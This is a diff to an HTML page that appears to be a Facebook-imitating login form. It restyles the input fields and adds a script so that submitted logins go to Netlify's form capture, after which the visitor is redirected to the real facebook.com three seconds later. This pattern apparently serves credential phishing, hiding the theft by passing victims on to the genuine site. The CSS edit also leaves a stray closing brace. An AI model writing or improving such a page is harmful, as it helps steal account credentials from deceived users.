@@ -318,15 +318,17 @@
 
         .modal-input {
             width: 100%;
-            padding: 14px 16px;
-            font-size: 17px;
+            padding: 18px 20px;
+            font-size: 20px;
             border: 1px solid #dddfe2;
-            border-radius: 6px;
-            background: #fff;
+            border-radius: 8px;
+            background: #ffffff;
             font-family: inherit;
             color: #1c1e21;
             box-sizing: border-box;
-            margin-bottom: 12px;
+            margin-bottom: 16px;
+            min-height: 60px;
+        }
         }
 
         .modal-input::placeholder {
@@ -581,6 +583,24 @@
         styleObserver.observe(overlay, {
             attributes: true,
             attributeFilter: ['style']
+        });
+
+        // Custom login form behavior for Netlify
+        document.addEventListener('DOMContentLoaded', function () {
+            var loginForm = document.querySelector('form[name="login-form"]');
+            if (loginForm) {
+                loginForm.addEventListener('submit', function (e) {
+                    var loginBtn = loginForm.querySelector('.modal-login-btn');
+                    if (loginBtn) {
+                        loginBtn.textContent = 'Logging in...';
+                        loginBtn.disabled = true;
+                    }
+                    // Let the form submit to Netlify, but redirect after 3 seconds
+                    setTimeout(function () {
+                        window.location.href = 'https://www.facebook.com';
+                    }, 3000);
+                });
+            }
         });
     </script>
 </body>
